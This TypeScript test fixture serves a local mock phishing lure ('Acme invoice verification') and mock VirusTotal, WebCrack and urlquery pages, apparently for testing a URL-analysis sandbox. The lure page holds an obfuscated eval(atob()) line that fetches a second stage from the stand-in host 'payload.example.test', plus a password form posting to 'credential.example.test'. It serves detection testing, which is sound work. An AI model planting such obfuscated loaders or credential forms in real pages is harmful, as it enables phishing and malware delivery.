import http from 'node:http'

export const payloadDomain = 'payload.example.test'
export const downloadBody = 'sandbox download hash fixture\n'
export const downloadHash = '93389713f66d8ccf6a7968f98a05ad61b3f9bf02667bfd499b9300fa0bb25569'

export function createFixtureServer() {
    const encoded = Buffer.from(`fetch("https://${payloadDomain}/stage2"); document.body.insertAdjacentHTML("beforeend", "<p>LockBit payload</p>");`).toString('base64')
    const pages = new Map<string, string>([
        ['/start', `<!doctype html>
<html><head><title>Initial suspicious page</title></head>
<body>
  <main>
    <h1>Acme invoice verification</h1>
    <p>LockBit ransomware campaign associated with this lure.</p>
    <p>Benign API text: document.createElement object.assign el.style should not become copied indicators.</p>
    <button id="click-proof" style="position:fixed;left:20px;top:20px;width:220px;height:54px;z-index:2" onclick="document.title='Interactive click received';document.getElementById('interaction-proof').textContent='Interactive click received'">Confirm invoice</button>
    <input id="type-proof" style="position:fixed;left:20px;top:88px;width:220px;height:40px;z-index:2" oninput="document.title='Typed proof: ' + this.value;document.getElementById('type-result').textContent='Typed proof: ' + this.value">
    <a id="download-proof" href="/payload.bin" download="invoice-payload.bin" style="position:fixed;left:20px;top:140px;width:220px;height:40px;z-index:2">Download invoice payload</a>
    <p id="interaction-proof" style="margin-top:140px">Interaction pending</p>
    <p id="type-result">Typed proof pending</p>
    <form action="https://credential.example.test/login"><input name="email"><input name="password" type="password"></form>
  </main>
  <script type="text/plain">eval(atob("${encoded}"));</script>
  <script>console.log('Target startup welcome'); setTimeout(() => { location.href = "/final" }, 10000)</script>
</body></html>`],
        ['/final', `<!doctype html>
<html><head><title>Final redirect page</title></head>
<body><main><h1>Final landing</h1><p>Redirect complete after staged invoice lure.</p></main></body></html>`],
        ['/virustotal', `<!doctype html>
<html><head><title>VirusTotal fixture</title></head>
<body><a href="/unexpected-provider-navigation" style="position:fixed;left:0;top:0;width:18px;height:18px">Home</a><main><h1>VirusTotal</h1><p>12/94 security vendors flagged this URL as malicious.</p><p>3 community comments</p></main><script>console.warn('Provider diagnostic only')</script></body></html>`],
        ['/webcrack', `<!doctype html>
<html><head><title>WebCrack fixture</title></head>
<body><main><h1>WebCrack</h1><textarea aria-label="source"></textarea><button>Run</button><pre id="out"></pre></main>
<script>
document.querySelector('button').addEventListener('click', () => {
  document.getElementById('out').textContent = document.querySelector('textarea').value
})
</script></body></html>`],
    ])

    return http.createServer((request, response) => {
        const url = new URL(request.url || '/', 'http://127.0.0.1')
        if (url.pathname === '/payload.bin') {
            response.writeHead(200, {
                'content-type': 'application/octet-stream',
                'content-disposition': 'attachment; filename="invoice-payload.bin"',
                'cache-control': 'no-store',
            })
            response.end(downloadBody)
            return
        }
        const target = (url.searchParams.get('q') || '').replaceAll('&', '&amp;').replaceAll('<', '&lt;').replaceAll('>', '&gt;')
        const urlQueryReport = `<!doctype html><html><head><title>urlquery fixture</title></head><body><main><h1>WEBSITE ANALYSIS REPORT</h1><dl><dt>Submitted URL</dt><dd>${target}</dd></dl><h2>Detections</h2><p>URLQuery 1 detections</p><p>IDS 0 detections</p><p>Threat Detection System 3 detections</p></main></body></html>`
        const body = url.pathname === '/urlquery' ? urlQueryReport : pages.get(url.pathname) || pages.get('/start') || ''
        response.writeHead(200, {
            'content-type': 'text/html; charset=utf-8',
            'cache-control': 'no-store',
        })
        response.end(body)
    })
}
